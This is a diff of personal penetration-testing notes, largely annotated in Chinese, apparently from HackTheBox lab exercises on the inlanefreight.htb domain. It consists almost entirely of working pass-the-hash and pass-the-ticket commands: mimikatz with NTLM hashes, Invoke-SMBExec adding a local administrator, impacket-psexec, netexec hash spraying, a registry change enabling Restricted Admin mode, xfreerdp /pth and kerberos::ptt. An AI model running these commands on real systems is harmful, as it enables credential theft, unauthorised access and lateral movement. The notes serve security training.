@@ -365,30 +365,8 @@ nxc smb STMIP -u jbader -p 'ILovePower333###' --spider HR --content --pattern "A
 smbclient //10.129.232.180/HR -U jbader                                                                  登录 HR 共享
 
 
-
-
-
-
-  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio" exit      (search for hashes)
-  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
-
-  PS c:\htb> cd C:\tools\Invoke-TheHash\
-  PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
-  PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
-
-  impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
-  https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
-  https://github.com/fortra/impacket/blob/master/examples/atexec.py
-  https://github.com/fortra/impacket/blob/master/examples/smbexec.py
-
-  netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
-
-  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-    use nxc -x to do the above, then
-  xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
-
-
 哈希传递
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio" exit      搜寻哈希
 C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit            弹出新cmd，dir \\dc01\julio 连接到 juliio 的共享
  
 
@@ -418,6 +396,7 @@ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF345
 
 
 c:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f      启用“受限管理员模式”（Restricted Admin mode），允许哈希登录
+nxc smb STMIP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'      用 nxc -x 改注册表
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 用户帐户控制 (User Account Control, UAC) 限制了本地用户执行远程管理操作
@@ -436,10 +415,7 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 
 
-Pass the Tickets (PtT):
-  mimikatz.exe
-  privilege::debug
-  sekurlsa::ekeys
+
   kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
 
   Enter-PSSession -ComputerName DC01
